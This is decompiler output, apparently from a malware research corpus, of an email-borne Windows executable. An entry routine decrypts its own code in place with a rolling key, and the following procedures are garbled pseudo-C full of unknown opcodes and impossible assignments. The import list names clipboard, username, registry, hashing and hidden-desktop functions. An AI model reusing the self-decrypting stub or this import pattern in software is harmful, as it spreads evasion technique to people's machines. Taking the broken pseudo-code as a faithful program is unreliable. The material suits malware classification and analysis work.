/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1451/ia32_pe/subject.exe'
 */

/*	Procedure: 0x004112B0 - 0x00411383
 *	Argument size: 28
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__(A8, Ac, A10, A18, A20)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A18;
/* unknown */ void  A20;
{
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffec;



    (save)edi;
    edi = esp;
    esp = esp - 40;
    Vffffffdc = 0;
L00411329:
    Vffffffe0 = 0;
    Vffffffec = -888420054;
L00411333:
    do {
        (save)ecx;
        (save)0;
        *__imp__GetMenuItemID(0);
        A18 = A18 + eax;
        for(A20 = 0x411358; 1; A10 = A10 + *__imp__GetMenuItemID(0)) {
            esi = A20;
            bl = A18;
            if(A8 == 666) {
                *esi = *esi - bl;
            }
            A20 = A20 + 1;
            esi = 0x4115fa;
            if(A20 > 0x4115fa) {
                break;
            }
            A18 = A18 >> 8;
            Ac = Ac + 1;
            if(Ac != 4) {
                continue;
            }
            Ac = 0;
            A18 = -888420054;
            (save)ecx;
            (save)0;
        }
        A8 = A8 + 1;
        if(A8 != 1000) {
            goto L00411329;
        }
        esp = edi;
        (restore)edi;
        asm("loop 0x41134d");
        asm("aam 0xd6");
        asm("hlt");
        al = al + 23;
        asm("out dx,eax");
        asm("retf");
        ecx = 0;
        if(*(ebp - 49) >= cl) {
            goto L00411333;
        }
        ecx = 0 & 255;
        esi = esi | *ebx;
        *LEB912880 = (frestore);
        asm("adc ch,[edi+0xba8b319a]");
    } while(esi = esi & ebx);
    *ecx = *ecx - 197852340;
    asm("retf");
}

/* DEST BLOCK NOT FOUND: 00411438 -> 2a0c22be */
stack space not deallocated on return
/*	Procedure: 0x00411384 - 0x00411485
 *	Argument size: -13554
 *	Local size: 0
 *	Save regs size: 0
 */

L00411384()
{



    ah = 37;
    asm("das");
    asm("Unknown opcode 0xd3");
    ah = 197;
    asm("Unknown opcode 0x8e");
    edx = 192225325;
    asm("xchg eax,ecx");
    esp = ebp;
    (restore)ebp;
    asm("sbb ecx,ebx");
    *ecx = *ecx - esi;
    ecx = ecx | ebx;
    -907502070 = ecx * ecx;
    esp = esp - (ecx | *ebx);
    al = *edi;
    asm("lock push eax");
    *edi = eax;
    edi = edi + 4;
    asm("retf");
    ecx = *ebx;
    cl = 0;
    asm("rcl byte [edx-0x33],cl");
    esp = ebp;
    (restore)ebp;
    ecx = ecx | ebx;
    asm("aad 0xdb");
    ecx = ecx | ebx;
    asm("lock push eax");
L004113ba:
    ecx = ebx;
    ecx = ebx;
    ecx = 0;
    asm("rcl byte [edx-0x53],cl");
    esp = ebp;
    (restore)ebp;
    ecx = ecx | ebx;
    ecx = ebx;
    ah = 160;
    asm("Unknown opcode 0x8e");
    eax = ecx - 4;
    asm("aam 0x31");
    ah = 24;
    (restore)ds;
    asm("into");
    asm("cli");
    asm("cld");
    asm("aam 0x56");
    asm("wait");
    asm("aad 0x8c");
    asm("xchg eax,ecx");
    ecx = 0;
    asm("retf");
    *(edi + eax + 78) = edx;
    asm("sbb ch,cl");
    asm("bound esi,[0xd37dc869]");
    if(ebx = ebx - 1) {
        goto L004113ba;
    }
    asm("fisubr word [esp+ebp*4]");
    esi = *ebx;
    return(al | 170);
    ecx = 0;
    >= ? L004113a6 : ;
    al = *esi;
    esi = esi + 1;
    bl = 51;
    (save)esi;
    14 = ebp * edx;
    eax = eax | -888418759;
    696486798 = 0;
L00411411:
    asm("xchg eax,esi");
    return;
    asm("out 0x21,eax");
    (save)ds;
    al = al | 41;
    asm("Unknown opcode 0x82");
    eax = eax + 919169760;
    asm("cdq");
    asm("sbb al,0x6d");
    asm("insb");
    edx = edx ^ *(ebx - 110);
    (save)ss;
    asm("xchg eax,esi");
    *(ecx + -568078231) = *(ecx + -568078231) - ch;
    esp = esp - 1;
    asm("retf");
    (save)esi;
    *esi = *esi & ebx;
    al = al | 41;
    (save)esp;
    asm("jecxz 0x411436");
    goto L2a0c22be;
    esp = ebp;
    (restore)ebp;
    (save)ebx;
    asm("%s jmp 0x5cdc4b36");
    asm("xchg eax,edx");
    asm("xchg eax,esi");
    eax :: -875476427;
    *ecx = *ecx - ecx;
    edi = edi | esi;
    goto L1a0f25a8;
    *(esi + 199758278) = *(esi + 199758278) - edx;
    asm("retf");
    *(ecx + ebx + 86) = *(ecx + ebx + 86) - edx;
    asm("daa");
    asm("hlt");
    esp = -1951650641;
    ecx = ecx ^ *(edx + ebp * 4);
    return;
    ecx = 0;
    if(edx = edx + *(esi + 28)) {
        goto L00411411;
    }
    asm("loope 0x41144d");
    ebp = ebp | *%fs:ecx];
    asm("enter 0x8edb,0x89");
    (save)esp;
    *(eax + edx - 55) = *(eax + edx - 55) | ecx;
    asm("sti");
    asm("retf 0x4c28");
}

stack space not deallocated on return
/*	Procedure: 0x00411486 - 0x004115FF
 *	Argument size: -30372
 *	Local size: 0
 *	Save regs size: 0
 */

L00411486()
{



    *edi = *edi >> cl;
    asm("in al,0x11");
    bh = bh ^ al;
    eax = eax + -67185412;
L00411491:
    asm("int1");
    *esi = *esi - eax;
    *(esp + edx) = *(esp + edx) & bh;
    *(ecx + edx * 8) = ss;
    esp = esp - 1;
    esi = esi - 1;
    cl = cl & ch;
    asm("adc dl,0xe4");
    asm("adc [edx],esi");
    asm("clc");
    eax = eax + 1796330748;
    esp = esp - 1;
    eax = eax + -1968396845;
    asm("Unknown opcode 0xd0");
    ah = 15;
    (restore)es;
    asm("into");
    asm("out dx,eax");
    al = al + 251;
    edi = edi + 1;
    *edx = *edx + ebp;
    -47 = *(esi - 17) * ecx;
    asm("enter 0x28ca,0xc8");
    al = al | bh;
    asm("adc al,0xce");
    asm("scasd");
    asm("into");
    al = al + 62;
    asm("adc dl,[esi+0x47]");
    esp = esp - 1;
    asm("stc");
    asm("Unknown opcode 0xc7");
L004114d0:
    if(al >= 164) {
        goto L00411491;
    }
    (restore)esp;
    *(ebx - 50) = ecx;
    al = al + 62;
    asm("adc dl,[esi+0x47]");
    esp = esp - 1;
    asm("stc");
    asm("Unknown opcode 0xc7");
    al :: 164;
    (save)ds;
    ebp = *esp;
    asm("adc dl,0xb4");
    asm("out 0x8e,eax");
    ecx = 1055317029;
L004114ed:
    asm("paddb mm2,mm4");
    asm("adc esp,ecx");
    if(esi = esi - 1) {
        goto L004114d0;
    }
    goto L00008e0f;
    ebx = 1448951080;
    asm("adc esp,ecx");
    asm("out 0x40,al");
    *(ecx + ebp + 78) = *(ecx + ebp + 78) ^ dl;
    (restore)ss;
    asm("lds ebx,[esi]");
    asm("cmpsb");
    al :: 146;
    (save)cs;
    asm("cmpsb");
    asm("sahf");
    asm("rcl byte [esi+0x7b7ace9],1");
    asm("aam 0x40");
    esi = esi + 1;
    cl = cl | *esi;
    asm("cmpsb");
    asm("sahf");
    asm("rcl byte [esi+0x7b7ace9],1");
    (fsave)(frestore) + *(esp + ebx * 8) + *(esp + ebx * 8);
L0041152e:
    asm("aam 0xce");
    al = al + 62;
    asm("adc dl,[esi+0x47]");
    esp = esp - 1;
    asm("stc");
    asm("Unknown opcode 0xc7");
    if(al <= 164) {
        goto L004114ed;
    }
    eax = cs;
    *(edx + ecx + 211463370) = *(edx + ecx + 211463370) - edi;
    eax = *(esi + 63)(esi, 10);
    asm("cli");
    asm("sbb al,0x6d");
    asm("xchg eax,esi");
    ebp = -905299182;
    *edx = *edx - ch;
    asm("into");
    (save)esi;
    eax = eax + 702786605;
    (restore)ebp;
    edx = edx | *(esi + 105);
    asm("stc");
    asm("xchg eax,esi");
    esi = esi | *LB4E74B54;
    esp = ebp;
    (restore)ebp;
    asm("xchg eax,esi");
    ebx = esp;
    (restore)es;
    if(!(esi = esi | *ecx)) {
        > ? L0041154f : ;
        eax = *LEF4EFBCC;
        asm("loope 0x41151d");
        >= ? 0x4115f6 : ;
        <= ? L004115da : ;
        >= ? 0x4115fa : ;
L00411580:
        asm("int3");
        asm("rcr byte [ebx],cl");
        asm("salc");
        asm("sbb [esi+0x1b16b4b7],edx");
        asm("Unknown opcode 0xfe");
        asm("sti");
        (save)esp;
        bh = bh | 180;
        *esi = *esi - 1;
        return;
        (restore)ebx;
        asm("Unknown opcode 0x8c");
        asm("int1");
        *(edi + ecx * 8) = *(edi + ecx * 8) >> 1;
L0041159b:
        if(ebp = ebp - 1) {
            goto L0041152e;
        }
        ebx = *(esi + -1440848962);
        asm("retf 0xc929");
        if(al = al + 10) {
            goto L00411580;
        }
        asm("%f int3");
        > ? L00411598 : ;
        al = *esi;
        esi = esi + 1;
        *edi = cs;
        dh = 24;
        al = al & 142;
        asm("adc [0x124e4dcd],ch");
        asm("retf 0xc48e");
        asm("aad 0x4e");
        asm("adc al,0xcd");
    }
    asm("xchg eax,esi");
    asm("scasb");
    asm("adc al,[eax+0x9a28ca08]");
    asm("in eax,dx");
    (save)esi;
    if(*esi = *esi - edi) {
        goto L0041159b;
    }
    (save)cs;
    eax = L0000aaaa();
    cl = cl | dl;
    ecx = 0;
    asm("xchg eax,esi");
    *L0A8CE2CC = *L0A8CE2CC & dh;
    asm("retf");
    (save)cs;
    asm("pushf");
    (save)cs;
    *L1896DCB2 = 219;
    esp = esp ^ ecx;
    asm("ficom dword [esi+esi*2-0x33]");
    asm("o16 mov dh,0xb8");
    *eax = es;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* address  size  */
/* 0x004112b0       0 */ /* unknown */ void 	__entry_point__;
/* 0x00415289       0 */ /* unknown */ void 	__imp__CryptAcquireContextW;
/* 0x0041528d       0 */ /* unknown */ void 	__imp__CryptDestroyHash;
/* 0x00415291       0 */ /* unknown */ void 	__imp__CryptHashData;
/* 0x00415295       0 */ /* unknown */ void 	__imp__GetUserNameW;
/* 0x00415299       0 */ /* unknown */ void 	__imp__RegCreateKeyExA;
/* 0x0041529d       0 */ /* unknown */ void 	__imp__RegEnumKeyExA;
/* 0x004152c1       0 */ /* unknown */ void 	__imp__PathCombineW;
/* 0x004152c5       0 */ /* unknown */ void 	__imp__PathFileExistsW;
/* 0x004152c9       0 */ /* unknown */ void 	__imp__PathFindFileNameW;
/* 0x004152cd       0 */ /* unknown */ void 	__imp__wnsprintfA;
/* 0x004152d1       0 */ /* unknown */ void 	__imp__wnsprintfW;
/* 0x004152d5       0 */ /* unknown */ void 	__imp__wvnsprintfA;
/* 0x004152d9       0 */ /* unknown */ void 	__imp__wvnsprintfW;
/* 0x00415301       0 */ /* unknown */ void 	__imp__DispatchMessageA;
/* 0x00415305       0 */ /* unknown */ void 	__imp__GetClassNameA;
/* 0x00415309       0 */ /* unknown */ void 	__imp__GetClipboardData;
/* 0x0041530d       0 */ /* unknown */ void 	__imp__GetCursorPos;
/* 0x00415311       0 */ /* unknown */ void 	__imp__GetDlgItemTextA;
/* 0x00415315       0 */ /* unknown */ void 	__imp__GetMenuItemID;
/* 0x00415319       0 */ /* unknown */ void 	__imp__SetProcessWindowStation;
/* 0x0041531d       0 */ /* unknown */ void 	__imp__SetThreadDesktop;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
